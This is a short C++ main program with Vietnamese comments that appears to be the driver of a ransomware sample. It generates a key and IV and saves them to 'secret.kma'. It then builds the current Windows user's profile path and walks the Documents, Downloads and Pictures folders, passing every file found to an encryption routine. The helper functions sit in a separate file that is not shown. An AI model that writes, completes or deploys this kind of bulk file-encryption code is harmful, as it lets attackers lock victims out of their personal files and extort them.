#include "function.cpp"

int main()
{
    if (!filesExist("secret.kma"))
    {
        uint8_t key[16];
        uint8_t iv[16];

        generateKeyAndIV(key, iv, size);
        saveKeyAndIVToDesktop("secret.kma", key, iv, size);

        std::string username = getCurrentUsername();
        std::string path = "C:\\Users\\" + username + "\\";

        // Các thư mục cần xem
        std::vector<std::string> folders = {"Documents", "Downloads", "Pictures"};

        for (const auto &folder : folders)
        {
            std::string folderPath = path + folder + "\\";

            // Liệt kê các tệp và thư mục trong thư mục hiện tại
            std::vector<FileItem> items = listFilesAndDirectories(folderPath);

            enc(items, "", folderPath, key, iv);
        }
    }

    return 0;
}